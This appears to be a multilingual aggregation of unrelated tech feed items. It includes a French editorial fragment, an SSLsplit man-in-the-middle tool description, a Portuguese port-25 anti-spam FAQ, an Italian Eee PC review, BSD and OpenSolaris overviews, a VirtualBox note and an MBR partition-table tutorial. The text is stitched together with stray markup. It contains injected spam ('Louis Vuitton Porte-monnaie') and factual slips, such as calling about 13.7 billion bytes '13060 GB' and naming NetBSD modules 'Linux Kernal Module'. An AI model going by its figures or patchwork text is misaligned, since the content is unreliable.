reprendre la main sur un marché qu’il a tout simplement raté jusqu’à présent. Un autre danger guette le couple Intel/Microsoft : l’arrivée des processeurs ARM 64 bits équipés de multiples cœurs. Une architecture clairement taillée pour les serveurs d’entreprises et le cloud computing sur lequel les OS open source sont donc à ce jour naturellement avantagés. Doit-on voir dans tous ces chamboulements, un basculement technologique en faveur des systèmes d’exploitation open source ? Personnellement je n’en serais pas trop étonné. Reste à voir si c’est seulement l’open source qui en sortira gagnant ou si le logiciel libre saura saisir l’occasion qui se présente. On se retrouve pour un prochain édito semaine prochaine. En attendant, portez-vous bien et à très bientôt.

  <title><![CDATA[[SSLsplit 0.4.5] Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections]]></title>
  <summary><![CDATA[SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.  Connections are transparently intercepted through a network address translation engine and redirected to SSLsplit.  SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted.  SSLsplit is intended to be useful for network forensics and penetration testing.  SSLsplit supports plain TCP, plain SSL, HTTP and HTTPS connections over both IPv4 and IPv6.  For SSL and HTTPS connections, SSLsplit generates and signs forged X509v3 certificates on-the-fly, based on the original server certificate subject DN and subjectAltName extension.  SSLsplit fully supports Server Name Indication (SNI) and is able to work with RSA, DSA and ECDSA keys and DHE and ECDHE cipher suites.  SSLsplit can also use existing certificates of which the private key is available, instead of generating forged ones.  SSLsplit supports NULL-prefix CN certificates and can deny OCSP requests in a generic way.
 

Requirements  SSLsplit depends on the OpenSSL and libevent 2.x libraries. The build depends on GNU make and a POSIX.2 environment in `PATH`. The (optional) unit tests depend on check.  SSLsplit currently supports the following operating systems and NAT engines:

   FreeBSD: pf rdr, ipfw fwd, ipfilter rdr
   OpenBSD: pf rdr
   Linux: netfilter REDIRECT and TPROXY
   Mac OS X: ipfw fwd


  

Installation      make     make test       # optional unit tests     make install    # optional install  Dependencies are autoconfigured using pkg-config.  If dependencies are not picked up and fixing `PKG_CONFIG_PATH` does not help, you can specify their respective locations manually by setting `OPENSSL_BASE`, `LIBEVENT_BASE` and/or `CHECK_BASE` to the respective prefixes.  You can override the default install prefix (`/usr/local`) by setting `PREFIX`.  

Development  SSLsplit is being developed on Github.  For bug reports, please use the Github issue tracker.  For patch submissions, please send me pull requests.  Download SSLsplit 0.4.5]]></summary>

  <title><![CDATA[Dúvidas Mais Frequentes sobre a Adoção de Gerência de Porta 25]]></title>
  <summary><![CDATA[Qual problema a gerência de porta 25 vai resolver? 
Hoje spammers do mundo todo abusam computadores de usuários de Internet no Brasil para enviar mensagens para outros países de forma anônima e gratuita. A gerência de porta 25 vai impedir que nossas redes sejam abusadas por esses spammers, impedir o desperdício de banda e retirar o Brasil de listas internacionais de países que mais enviam spam. 
Mas o que é gerência de porta 25? 
É o conjunto de ações, aplicadas em redes residenciais, para separar a submissão de e-mails por um usuário, do transporte de mensagens entre servidores de e-mail. A submissão de e-mails, feita via softwares como Thunderbird e Outlook, passa a ser por uma porta exclusiva para esse fim: a 587/TCP, com autenticação. Já o transporte continua sendo feito via 25/TCP. 
Como isso impede o spam? 
Quando os usuários adotarem a porta 587/TCP, a operadora (de ADSL, cabo, 3G, etc) poderá filtrar o tráfego com destino à porta 25/TCP. Desse modo, os e-mails legítimos, que usam uma porta diferente, não são afetados. Mas os spams, que são enviados por máquinas infectadas/botnets direto para servidores de e-mail, não saem da rede. 
Qual será o impacto para os usuários de e-mail? 
Para quem usa programas leitores de e-mail será necessária, apenas, a alteração de sua configuração para mudar a porta de envio (SMTP) para 587. 
Isto também afeta quem usa webmail? 
Não. Aqueles que utilizam webmail não terão que fazer nenhuma configuração adicional. 
  
Serviços como Gmail, Yahoo! e Hotmail serão afetados? 
Haverá mudanças apenas para quem usa programas leitores de e-mail, quem usa esses serviços via webmail não precisa mudar a configuração. Todos estes provedores de e-mail já oferecem o serviço de submissão na porta 587/TCP. 
Um spammer não consegue mandar e-mails via porta 587/TCP? 
Se ele possuir uma conta e senha em um provedor de e-mail ou furtar conta e senha em um computador infectado, sim. Mas como esse envio tem que ser autenticado e usando um servidor legítimo, os provedores de serviços de e-mail podem aplicar medidas preventivas. 
 
Mas se existem filtros anti-spam, quais as vantagens dessa ação? 
Impedir que o spam saia da rede onde está a máquina infectada. Isso evita o desperdício de banda e que o usuário vítima do spammer pague a conta do envio das mensagens. Os servidores de e-mail também ficam menos carregados, aumentando a qualidade do serviço. 
Todos os provedores de e-mail já estão adotando? 
A maioria dos provedores já migrou seus usuários para a nova porta. 
 
Existe um prazo para que todos adotem esta recomendação? 
Já foi assinado um Acordo de Cooperação entre as Operadoras de Telecomunicações, os Provedores de Acesso, a Anatel e o CGI.br. A adoção está sendo gradual e ocorrerá até o final de 2012. 
O site www.antispam.br possui mais informações.

MasterizzazioneGrafica e Multimedia Computer graphics, finalmente terminata l'attesa degli utenti italiani che da tempo seguono con impazienza le vicende dell'ultraportatile Asus Eee PC senza però poterlo toccare con mano: il 21 Gennaio 2008 Asus Eee PC fa ufficialmente il suo ingresso sul mercato italiano dopo l'ottimo successo di vendite riscosso in tutto il mondoNotebookitalia è stato fra i primi ad interessarsi a questo rivoluzionario computer portatile sin da quando non era stato ancora rivelato il suo nome definitivo e veniva ancora chiamato  Abbiamo seguito giorno dopo giorno la sua evoluzione dalla presentazione al Computex 2007 al lancio a Taiwan dall'uscita dei primi modelli colorati al successo di mercato fino all'annuncio di una nuova generazione di Eee PC equipaggiata con WiMAX e display da 8 pollici Ben 21 notizie che costituiscono la più completa raccolta di informazioni al momento disponibili in Italia su questo laptopCome negli Stati Uniti anche in Italia il primo modello disponibile sarà quello contraddistinto dalla sigla Eee PC 701 4G nelle colorazioni biancao nera (pearl white o galaxy black a voler essere precisi) fornito di un processore Intel Celeron M a 630 MHz di 512 MB di memoria di un disco SSD da 4GB sottosistema grafico Intel GMA 900 schermo LCD da 7 pollici WVGA (800×480) webcam da 03MP e microfono lettore di schede di memoria e supporto per reti Wi-Fi b/g VGA Ethernet e 3 USB 20 Con un peso di appena 920 grammi e batteria a 6 celle il piccolo di casa Asus utilizza come sistema operativo preinstallato la distribuzione Linux Xandros in una versione personalizzata dall’azienda taiwaneseRicordiamo che all'estero sono disponili altri tre colori ("Blush Pink" "Sky Blue" e "Lush Green")e atri modelli ma Asus considera la versione 4G 701 la più appetibile per la configurazione equilibrata e per l'ottimo rapporto qualità/prezzo Facendo una rapida carrellata le differenze fondamentali fra i diversi modelli risiedono nel quantitativo di memoria e nella capacità del modulo SSD: Asus Eee PC 2G 701 (256MB e 2GB) 4G 701 (512MB e 4GB) 8G 701 (1GB e 8GB) A questi si aggiungono le varianti 4G Surf e 2G Surf distinguibili solo per assenza di webcam e batteria più piccola da 4400mAhIndirizzato prevalentemente ad un pubblico giovane con finalità educative (non dimentichiamoci che l'Asus Eee PC deriva dall'Intel Classmate) questo laptop ha rapidamente sedotto una più vasta platea di utenti interessati ad un notebook leggero a basso costo in grado di connettersi ad Internet ovunque Nonostante le sue ridotte dimensioni è una macchina versatile e completa semplice da usare e capace di svolgere in modo fluido i compiti più comuniSpecifiche tecnicheImpressioni generaliChi ha la possibilità e e la fortuna di recensire tanti notebook diversi durante l’anno difficilmente riesce ancora ad entusiasmarsi toccando un laptop L’arrivo dell’Eee PC però nella nostra Redazione ha generato autentica curiosità e meraviglia Questo notebook ha all'incirca il formato di un quaderno è maneggevole e può essere tenuto facilmente in una sola manoL’esterno ha un rivestimento lucido madreperlaceo molto delicato e sensibile alle ditate ma ad un primo sguardo sembra che lo chassis sia più resistente allo sporco rispetto alla scocca bianca di un Macbook di gran lunga più delicata Le cerniere del coperchio sono molto grandi e sembrano sufficientemente robuste Lo schermo da 7 pollici è fiancheggiato da due grandi altoparlanti ed è circondato da un'ampia cornice Il modello 4G è dotato di una webcam da 03MP incastonata nella parte superiore del piccolo pannello LCDAprendo il piccolo display-lid salta subito agli occhi una serie di LED luminosi collocati in basso a destra che indicano lo stato della batteria il funzionamento dell’hard disk e l’attivazione della connessione wireless Il design è gradevole: Asus eee PC è un vero notebook in miniaturaInterfacceDate le ridotte dimensioni l’Eee PC sorprende per la buona dotazione di interfacce di rete di porte e di slot di espansioneAudioGli altoparlanti integrati posti ai due lati dello schermo producono un suono pulito equiparabile e forse anche migliore di quello che possiamo ascoltare su tanti notebook di taglia maggiore Nonostante le piccole dimensioni del dispositivo ill volume è alto tanto da non avere la necessità di utilizzare casse esterne o cuffie durante la riproduzione di contenuti multimedialiSolo in rari casi come è prevedibile gli altoparlanti tendono a produrre stridii soprattutto sugli acuti quando ilvolume è molto alto Anche la collocazione degli altoparlanti potrebbe definirsi ottimale in quanto l’utente evita di coprirli erroneamente durante l’utilizzo del laptopIl microfono integrato al contrario non è tra i dispositivi più efficienti in dotazione ma ciò non stupisce per le ridotte dimensioni del laptop Testato con programmi di messagging istantaneo come MSN o Skype abbiamo rilevato un volume del microfono sufficienteSchermoIl pannello LCD dell’Asus Eee PC 4G ha un formato da 7 pollici anche se la cornice che lo circonda è così spessa che potrebbe ospitare un display da 8 pollici senza difficoltà (è in arrivo una nuova generazione di Eee PC con display più ampio) E’ forse questo il grande limite del piccolo di casa Asus il quale comunque offre la possibilità di godersi un film o ascoltare musica nel tempo libero ma non consente lunghe sessioni di lavoro senza stancare la vistaLa brillantezza del display è discreta solo in un ambiente fortemente illuminato dalla luce solare il pannello LCD perde considerevolmente la sua leggibilità Trattandosi di un display opaco comunque questo inconveniente è ridottoLo schermo ha una risoluzione massima di 800x480 un dettaglio molto basso ma accettabile se si considera che è uno schermi più piccoli in commercio E’ pur vero comunque che i display montati su telefoni cellulari di ultima generazione possiedono la stessa risoluzione su un formato più piccolo Dispositivi di inputLa tastiera e il touchpad dell’Eee PC rappresentano come immaginabile la debolezza più significativa di questo dispositivo Entrambi hanno dimensioni molto piccole e sembra quasi affollino la base del laptop lasciando poco spazio libero La disposizione dei tasti è standard ma le loro dimensioni portano molto spesso a compiere errori di battitura digitando frequentemente il tasto errato Dopo qualche ora di utilizzo però si acquista confidenza con la piccola tastiera e dopo parecchi giorni di uso l’utente non avrà difficoltà a scrivere su di essa come su di una normale tastiera di un laptop Tra gli errori più frequenti vi è senza dubbio la digitazione del tasto ENTER spesso premuto al posto dell’apostrofoNonostante le sue ridotte ed essenziali funzioni la tastiera dell’Eee PC possiede una fila di tasti F che possono essere utilizzati per alcune applicazioni come regolare volume e luminosità dello schermo Forse potrebbe risultare poco indicata per utenti con mani molto grandi ma testandola prima dell’acquisto o semplicemente adottando una tastiera esterna qualsiasi difficoltà verrebbe rimossa Una chicca è data dal comune tasto Windows che nell’ultraportatile Asus è sostituito da un’icona raffigurante una casaCome la tastiera anche il touchpad è molto piccolo e richiederà dunque agli utenti precisione e pazienza nel suo utilizzo Alla parte inferiore del touchpad è presente una singolo tasto al posto del tradizionale tasto destro e sinistro ma a seconda del lato premuto esso acquista entrambe le funzioni Sulla maggiorparte delle distribuzioni Linux è possibile simulare il click premendo simultaneamente i due tasti ma nel caso dell’Eee è difficile farlo Il touchpad ha supporto per tap-clicking e finger scrollingDiositivi di archiviazioneL’unità ottica come facilmente immaginabile è assente Ciò potrebbe far desistere dall’acquisto alcuni potenziali clienti ma dalla nostra breve esperienza con il subnotebook Asus possiamo sottolineare che lo slot SD card è sufficiente per il trasferimento di fileConclusioniL’Asus Eee PC offre un valore aggiunto a tutti gli utenti Linux ma costituisce anche un'ottima opportunità di provare una nuova piattaforma agli utenti Windows Garantire tutte le funzioni di un notebook in un prodotto compatto leggero e a buon mercato è stata la sfida che Asus ha affrontato e vinto con l'Eee

  <summary><![CDATA[fongxiong posted an update: WeRecoverDatacom - NetBSD 
Introduction 
NetBSD is an open-source version of Berkeley Software Distribution (BSD) operating system. BSD is a derivative of UNIX operative system and is being developed and distributed by the Computer Systems Research Group of the University of California, Berkeley. NetBSD is freely distributed under a business friendly license. The software is best known for its portability and security features, and it is mostly used in embedded systems. Being an open-source software solution, NetBSD is being developed and supported by an open community. The current stable release of NetBSD is version 4.0.1, released in October 2008. 
Important features 
Stable Codebase 
NetBSD codebase has been open to public scrutiny since the early 80s, so it has become one of the cleanest and most stable codebases available today. Because of this reason, NetBSD is used for building custom projects by several reputed organizations, including NASA. NASA used NetBSD in its SAMS-II project of measuring the microgravity environment on the International Space Station. Force10 Networks, which develops high-density Ethernet network infrastructure equipment, uses NetBSD as the underlying operating system for their high scalability switches/routers. Wasabi Systems, a provider of iSCSI SAN Products, offers a commercial Wasabi Certified BSD product based on NetBSD for embedded, server and storage applications.  
Support for Multiple Platforms 
The clean architecture of NetBSD enables it to support the latest hardware platforms available in Alpha, PowerPC, and PC systems, while still retaining support for older platforms. All this is done from a single source tree. This platform independence of NetBSD makes it the ideal platform to port to new machines and embedded platforms such as ARM, MIPS and Super-H based devices.  
Support for Multiple File Systems 
NetBSD can handle and manipulate different file systems to enable data exchange and binary compatibility. Some of them are ffs (Berkeley fast file system), lfs (log-structured file system), tmpfs (a type of memory file system), iso9660 (standard CD file system), msdosfs (Windows, MS-DOS, and Atari TOS) ntfs (Windows NT native file system), ext2fs (Linux extended file system), ados (AmigaDOS file system), and filecorefs (Acorn RISC OS file system).  
Apart from these, NetBSD also has a number of virtual file system types, including kernfs (access kernel information), nullfs (for loopback mounts), portal (portal daemon file system), procfs (access process information), umapfs (automatically remap uids and gids) and unionfs (attaches). 
The new NetBSD also provides the puffs framework to create file systems as user space servers, giving a number of possibilities for developing new file systems in user space.  
Kernal Authorization Framework (Kauth) 
This is a new security feature incorporated starting from NetBSD 4.0 release. Kauth is a subsystem capable of managing all authorization requests within a kernel. It allows external modules to plug-in the authorization process,Louis Vuitton Porte-monnaie portable Femme P9600870. This feature allows implementation of new security models, either as part of the base system or as Linux Kernal Module (LKM).  
In-Kernel Packet Filtering Engine and Network Address Translation 
NetBSD uses an in-kernel packet filtering to filter traffic based on different criteria such as interface, protocol, operating system, source and destination. Another in-kernel feature, the network address translation (NAT) permits a local network of machines to use one set of addresses internally and a different set externally- a feature that would enhance the security of the network.  
Comprehensive Network Features 
NetBSD supports a variety of network types including ARCnet, ATM, Ethernet, FDDI, HIPPI, PPP, SLIP, and Token Ring. NetBSD provides total in-kernel network file system (NFS) client and server support, for both NFS2 and NFS3 protocols. It also supports other protocols, including Appletalk, ISO, TCP/IP (IPv4) and TCP/IP (IPv6). 
Compatibility 
NetBSD is nearly compliant with IEEE 1003.1-1990 standard (POSIX.1) and mostly compliant with IEEE 1003.2-1992 (POSIX.2). It also provides system call-level binary compatibility with several UNIX-like operating systems including Linux, Apples Darwin, Solaris, HP-UX, Sun OS as well as other BSD variants like FreeBSD. 
WeRecoverData.com - OpenBSD 
OpenBSD is a freely available operating system derived from Berkeley Software Distribution (BSD) operating system. BSD is a UNIX derivative developed at the University of California, Berkeley. OpenBD supports binary emulation of programs from a number of operating systems such as Solaris, Linux, SunOS, HP-UX, as well as other BSD variants like FreeBSD and BSD/OS. It is known for enhanced security features that are not found in other operating systems.  
OpenBSD project insists on open source code and quality documentation. Developers audit the source code for software bugs and other security threats. The project is licensed through the open source BSD license or its variants. The project is coordinated by Theo de Raadt, Canada and is supported by several developers worldwide. The latest release is the OpenBSD 4.4, released in November 2008. The next release is scheduled for May 2009. 
Important features 
Supports Multiple Hardware Platforms 
OpenBSD runs on 17 different hardware platforms. Some of them include Digital Alpha-based systems, AMD64-based systems, ARM-based appliances, HP 9000 series 300 and 400 workstations, HPPA Systems, Apple New World Power PC-based machines, and Sun SPARC systems.  
Because of its interoperability with many hardware platforms, users can avoid customizing and tweaking of the software. OpenBSD project also discourages this practice. 
Clean and Secure Source Code 
OpenBSD is reportedly the most secure UNIX-like operating system. This is achieved by the scrupulous auditing process of the source code.  
OpenBSD is distributed with a large number of third-party software products. Some of them include X.org. 7.3, GCC versions 2.95.3 and 3.3.5. GNU C Compiler, Perl 5.8.8., Open SSL 0.9.7j, Lynx 2.8.5rel.4 text web browser, BIND 9.4.2-P2 DNS server 8.14.3 mail server, OpenNTPD Secure and simple Network Time Protocol implementation, and OpenBGPD and OpenOSPFD routing applications. 
Developers often patch the third-party products to improve the quality and security of the product. As a result, the software may differ slightly from the original version, though the patches usually do not largely affect the functionality. 
Available in Source Form 
OpenBSD kernel and userland programs are developed together in a single source repository. Third party software is available as binary packages, or they may be developed using the ports tree. 
New Features Added to OpenBSD 4.4 
Support for machines using the UltraSPARC IV/T1/T2 and Fujitsu SPARC64-V/VI/VII. 
Improvement for dhcpd. dhcpd now supports synchronization of lease files across multiple servers for redundancy. Unlike in the earlier versions, the new dhcpd does not use the dhcpd.interfaces file, but uses an entry in rc.conf.local. 
A sysmerge tool derived from the Mergemaster port. This tool makes it easier to merge configuration file changes while upgrading the software. 
hostname.* files with mode 600. This feature enables to keep the wireless keys and other configuration information secret. 
OpenBSD is widely known as a server operating system, but it can also be used for desktop applications. Many desktop applications are available through packages and ports.  
Summary: OpenBSD is a freely available, UNIX-like operating system developed by a team of international developers. The codes are scrutinized for their accuracy, resulting in a clean and secure operating system compatible with a large number of hardware platforms. 
WeRecoverData.com - OpenSolaris 
OpenSolaris is a free open-source operating system designed for desktops, laptops, servers and data centers. It is based on Sun Microsystems Solaris, a version of SVR4 UNIX. It is the only open source SVR4 derivative available today. Open Solaris is developed and maintained by an open community working in different projects and is licensed under common development and distribution license (CDDL).  
OpenSolaris source code functions as the basis for future versions of Solaris OS, other operating system projects, and third-party products. Sun Microsystems has announced that future versions of its commercial Solaris operating system will be based on OpenSolaris technology. 
The latest release of OpenSolaris is OpenSolaris 2008.11, released in December 2008. This software can be booted as a Live CD or installed directly. An important feature of this release includes a graphical user interface (GUI) for snapshotting capabilities. 
Distribution projects on OpenSolaris 
OpenSolaris has a number of distribution projects controlled by their respective project teams. OpenSolaris OS is a community-developed binary distribution based on the OpenSolaris source code. It runs on Intel and AMD processors on the server and desktop.  
Other major community distributions on OpenSolaris are the following: 
BeleniX: A *NIX distribution being used as a LiveCD distribution. 
Jaris: Jaris, aka Japanese Solaris, boots from LiveDVD and LiveUSB. Several Microsoft Windows based applications run under this application.  
MarTux: This is the first non-SXCR OpenSolaris distribution available for SPARC, and is bootable from Live CD/DVD. 
NexentaOS: A GNU-based open source operating system built on the top of OpenSolaris kernel and runtime. It integrates OpenSolaris and open source software (OSS) applications. 
NexentaStor: Based on Nexenta, NexentaStor is optimized for storage workloads. 
OpenSolaris 2008.05: Includes a network-based package management system (IPS), the GNOME desktop, and LiveCD technology supported on AMD64, Pentium, and Xeon EM64T platforms. 
SchilliX: An OpenSolaris based UNIX Live CD and distribution for the x86, x64 and EM64T architectures.  
MilaX: MilaX is based on Solaris Nevade. Because of its small size, the software can be installed in small-capacity storage devices such as bootable business cards, USB flash drives or Zip drives.  
Consolidations 
Operating System/Networking (ON) is the largest consolidation of OpenSolaris. ON consolidation includes kernel, drivers, commands, and networking. Apart from these, there are consolidations for application server, developer tools; documentation (docs), Man Pages; globalization Support (G11N); Java desktop (JDS); Java Platform Standard Edition (Java SE); Packaging/Installation Tools, Message Queue; Network Storage (NWS); Solaris FreeWare (SFW); SPARC Graphics Support; and X Windows System (X11) 
Scope of OpenSolaris 
According to Sun Microsystems, open-source projects like OpenSolaris create opportunities for collaboration between the company and the developer/ user community. This platform opens the door for a new generation of innovation. This is because OpenSolaris encourages startups to build innovative products around it. Big companies are also adopting OpenSolaris for high-end projects. Of late, Sun Microsystems and Toshiba America Information Systems jointly announced their plans to distribute Toshiba laptops pre-installed with OpenSolaris. 
However, OpenSolaris still has some encumbered binaries that result in closed source, caused due to third party drivers and encryption utilities. Developers are keen to reduce or eliminate this closed source. 
Summary: OpenSolaris is an open community-based operating system supported by Sun Microsystems. The platform supports a large number of community distributions and encourages companies to build innovative products on it.

  <summary><![CDATA[Marco de instalación virtual de un segundo sistema operativo en tu ordenador  
Los iniciados en cuestiones informáticas están siempre a la búsqueda de soluciones para sus programaciones, aplicaciones etc Vemos que hay multitud de programas que a los ajenos al mundo de la informática les resulta muy difícil comprender su utilidad. 
 
Normalmente, todos tenemos un sistema operativo instalado en nuestro equipo, bien sea Windows Vista, XP, Mac OS X, Windows 7... pero existe la posibilidad de poder instalar otro. Eso sí, podemos hacerlo pero de manera virtual. Eso significa que no afectará en nada al sistema operativo que tengamos instalado y funcionando en nuestro ordenador. Pero ¿cómo se hace esta instalación virtual? 
 
La forma de llevar a cabo la instalación virtual de un segundo sistema operativo es un proceso sencillo. En primer lugar, deberemos crear un marco virtual donde instalarlo, un marco de trabajo que sea compatible con el sistema operativo que vayamos a instalar. 
 
Virtual Box es precisamente eso: el marco donde alojaremos el sistema operativo de manera virtual. Esta aplicación es compatible con diversas versiones de Windows, Linux y OpenBSD.

  <summary><![CDATA[Introduction
 
I’ve always been curious about how disks are partitioned, and how the partition table looks like. This article will explain the format of the partition table and will provide a small tool (Partition Viewer) to demonstrate what we explained. 
The information in this article apply for x86 systems, I don’t know about disk partitioning on other systems. 
You are not required to have prior knowledge about disk partitioning; The goal of this article is to provide just the needed knowledge to understand disk partitioning, hence many details are left out for the readers to investigate by themselves. 
Please note that this article does NOT cover the GPT (GUID Partition table). 
Background
In this section I will introduce some concepts that are needed to understand the article. 
When you purchase a new hard-disk with a given capacity, all you can do with it is read/write raw data from first address up to last address. You can achieve that with special tools that can read an unformatted/unpartitioned disk. The data you read/write have no standard structure but the structure you devise. 
When we partition a disk, we are simply dividing the disk’s space into partitions (logical boundaries). For example a 10GB can be divided (theoratically) into as many partitions as one desires, say 3GB, 4GB and 3GB partitions. 
[======10 GB============] (before partitioning) 
[(3GB===)(4GB====)(3GB===)] (after partitioning) 
Practically, disk partitioning is more than just dividing the disk’s space into smaller partitions, but also attaching a given structure to each partition. 
Those structures are named “File systems”. You may have heard of FAT and NTFS file systems (supported by Microsoft Operating systems). 
File systems are a way to allow you to store your data in an organized manner (managable by the host operating system). That is why disk-partitioning has rules and limits (discussed later). For example, you can create a 10GB partition but you cannot attach to it the FAT16 file system, since FAT16 can only manage up to 2GB of disk space. Each file system has its cons and pros, which are not discussed in this document. 
To finalize the disk partitioning and file system relationship, you can imagine that a raw non-partitioned disk can be compared to a big room with no divisions where every employee scatters his stuff here and there, but when we divide (partitioning) that space with cubicals we have organized offices and rooms (File system). 
Disk addressing and capacity limitation
In this section we will try to explain the disk addressing concepts. 
Cylinder/Head/Sector (CHS) addressing
CHS stands for (C)ylinder/(H)ead/(S)ector addressing mode. Those three component together designates the target disk address. 
Logical Block Addressing (LBA)
LBA is linear addressing mode, starting from address 0 up to the maximum addressable location in the disk. 
As opposed to CHS addressing, LBA is much simpler and easier to understand and is used in modern operating systems. 
MBR and partition table format
In this section we will explain about the MBR (Master Boot record) and the format of the partition table and where it is located on the physical disk. 
The master boot record (MBR) is a structure that holds the boot loader program and the partition table. The MBR is always located at the very start of the disk, at LBA 0 or 0,0,1 in CHS addressing. 
The length of the MBR structure is 512 bytes. 



Offset (hex)
Size (in bytes)

Partition table


0x1FE-0x1FF
2
Signature (should be 0×55, 0xAA)



Usually, the role of the MBR is to find which parition table is active, load its boot sector and execute it 
The MBR loader can be infected with an MBR virus (sometimes refered to as bootkits) that runs even before the operating system boots (or the boot sector executes) 
Boot loader
The boot loader is a program whose sole purpose is to interpret the partition table and decide which partition should be booted from. 
The boot loader can be infected with a boot-sector virus that runs even before the operating system boots 
Here are the usual steps that are done by the boot loader: 

Load the partition table
Iterate through its entries looking for a partition entry marked as active
Once an active partition is found, we load the correspondance boot sector of that partition
If no active partitions are found then we halt
Once an active partition is found and its corresponding boot sector is loaded, then MBR executes the MBR code

Boot sector
In the previous section we introduced the term “boot sector” which is not to be confused with MBR’s “boot loader” 
The boot sector and the MBR are two different things. 
A boot sector is yet another structure, 512 bytes in size, that is file-system specific. 
Its function is to initiate the operating system and load it from the disk. 
Since the MBR will load a boot sector and execute it, the least requirements for a boot sector are: 

Offset 0 should have a valid x86 instruction so that when MBR runs it, the code does not crash the system
Offset 0x1FE should have the signature 0×55 0xAA (like the MBR)

In the case of MS-DOS, the boot sector program is responsible for loading IO.SYS and MS-DOS.SYS which will in turn load the COMMAND.COM 
Partition Table
The partition table is 64 bytes long and is located inside the MBR at sector 0x1BE. 
The partition table is an array of 4 partition table entries each of 16 bytes thus: 16×4 = 64. 
The format of each parition table entry is the following: 



Offset
Size
Item


0×00
1
Boot indicator; 0×80 = Active partition / 0×00 Inactive partition (boot_indicator)


0×01
1
partition start: head (chs_start.head)


0×02
1
partition start: sector (chs_start.sect)


0×03
1
partition start: cylinder (chs_start.cyl)


0×04
1
Partition ID (example ID=1 for FAT12) (system_indicator)


0×05
1
partition end: head (chs_end.head)


0×06
1
partition end: sector (chs_end.sector)


0×07
1
partition end: cylinder (chs_end.cyl)


0×08
4
Number of sectors before the beginning of this partition (sectors_before)


0x0C
4
Number of sectos in this partition (number_of_sectors)



You should note that the start and end CHS values are not as they are stored, instead, we have to extract their values from the bits. 
real cylinder value = ((chs.sector >> 6) << 8) | (chs.cyl) 
We take bits 6-7 from chs_sector which are the high bits of real_cyl_value and then combine them with chs_cyl which are the low bits of real_cyl_value. 
The reason they are encoded that way, is because the BIOS INT 0×13/AH=0×02 function (which reads a sector) requires this encoding: 
INT 13 - DISK - READ SECTOR(S) INTO MEMORY
	AH = 02h
	AL = number of sectors to read (must be nonzero)
	CH = low eight bits of cylinder number
	CL = sector number 1-63 (bits 0-5)
	     high two bits of cylinder (bits 6-7, hard disk only)
	DH = head number
	DL = drive number (bit 7 set for hard disk)
	ES:BX -> data buffer
The number_of_sectors field describes how many sectors are in this partition. This field can be used to determine the length of the partition. 
Similarly we can use (CHS_END – CHS_START) to determine the length of the partition. 
The number of sectors before (at offset 8) designate where the partition data begins starting from the partition table definition. If in the MBR, an entry has sectors_before equal 63 then this means that the boot sector of that partition is located at sector 63 
Primary and Extended partitions
A primary partition is a partition entry with an ID different than 5 and 15 and can have file system associated with it. 
Extended partitions unlike primary partitions, have IDs 5 or 15 and cannot have a file system associated with them, instead they point to another partition table that have at most two partition table entries. 
The second one can be an extended partition, thus nesting more paritions inside of it). 
Extended partitions can be considered as just containers of other partitions. We will demonstrate partition table nesting next. 
Partition table rules
The following partition table rules are take from other sources, I list only the most relevant ones (in the context of this article): 

Only partition can be active at a time
In the MBR partition table: at most 4 primary partitions can be created, or 3 primary partitions and 1 extended partition
In the extended partition table: there can be 0 or 1 extended partition link and 0 or 1 non-extended partition (thus two in total)
Partition table entries can have any order (we can exchange entry 1 with 2, etc…)

Nested Partitions
Because of the structure of the partition table located in the MBR, we realize that we can have at most 4 partiton table entries in each partition table. 
To overcome this limitation, special partition table entries are introduced that allow us to have an unlimited number of partitions that are linked together. 
Inside the MBR, the extended partition entry describes the size of all the partitions that will be contained inside of it (using the nb_of_sectors field), whereas the NbSectorsBefore or CHS_START will be used to compute the link to the next partition table which can contain at most 2 partition table entries. 
Those two entries are: (1) A normal partition entry (2) another extended partition entry pointing to the next linked partition. 
Interpreting a partition table manually with a hex editor
In this section we will demonstrate how to interpret the partition table manually using a hex editor that can display disk sectors. 
 
This screenshot shows the first sector of the disk. 
The bytes marked in yellow are the boot loader code. 
The bytes marked in red are the signature of the MBR which should always be 0×55 0xAA. 
The green area shows a complete partition table entry (16 bytes): 

00 : Boot indicator -> Inactive
01 01 00 : CHS_START -> Head = 1, Sector = 1, Cyl = 0
06: System Indicator -> FAT16B (>= 32 MB)
FE 3F 0B: CHS_END -> Head=254, Sector = 63, Cyl = 11
3F 00 00 00: Sectors Before -> 63
CD F0 02 00: Number of sectos -> 192717

Which means that this is a FAT16 partition of ~96MB. 
In the same manner we can interpret the result of the table and read it as:

CHS_END

28: Hidden Win95 FAT32 (LBA)
12543,254,63
29415015
4128705



Notice that entry #2 is an extended partition (sysid = 15) of size: (26748225 * 512) = 13695091200 bytes = 13060 GB 
This partition starts at sector 2666790 (sectors_before), let us go there and see the partition table pointed by it:

CHS_START

CHS_END

0
184,0,1
5: Extended
209,254,63
289170
417690



As we said, now every partition table that is pointed from the initial extended parition table entry have at most two entries. 
The first entry is a normal entry and the second entry (type = extended) is a link to another partition table. 
To compute the LBA of the second entry, we add to the sectors before the “sectors before” value from the extended partition table entry of the MBR, that is: 2666790+289170 = sector 2955960. 
Now we go there and read the partition table:

PartitionViewer Tool
For the sake of demonstration, I wrote a tool that ships with the following components: 

DiskSector.cpp/.h – A class to read/write raw disk sectors
partitionmanager.cpp/.h – A class that parses partition tables
MyDrawBar.cpp/.h – MFC static component to draw the partition tables
MyHistory.cpp/.h – MFC static component to draw the partition tables
PartitionViewer[Dlg].cpp/.h – The UI that uses the above helper classes

The PartitionViewer tool hardcodes only a small subset of the system IDs and colors: 
static const MYHISTORYBARTYPECOLOR part_colors[] = 
{
  {0x0,  RGB(255,255,255), "Free space"},
  {0x6,  RGB(100,10,0), "FAT16B (>= 32 MB)"},
  {0xC,  RGB(255,0,128), "Win95 FAT32 (LBA)"},
  {0xE,  RGB(0,110,110), "Win95 FAT16 (LBA)"},
  {0x7,  RGB(200,0,20), "Installable File System (NTFS, HPFS)"},
  {0x0B, RGB(10,100,0), "Win95 FAT32"},
  {0x83, RGB(20,200,0), "Linux native file system (Ext2/3)"},
  {0x17, RGB(10,0,100), "Hidden IFS (HPFS/NTFS)"},
  {0x82, RGB(101, 12, 130), "Linux swap / Solaris"},
  {0x1C, RGB(90, 127, 30), "Hidden Win95 FAT32 (LBA)"},
  {0x1E, RGB(0, 0, 255), "Hidden Win95 FAT16 (LBA)"},
  {0x04, RGB(101, 12, 130), "FAT16 <32MB"}
};
Feel free to extend that list. 
This program requires admin privilege to work because it accesses the disk sectors. 
Once executed: 
 
the partitions will be visualized. 

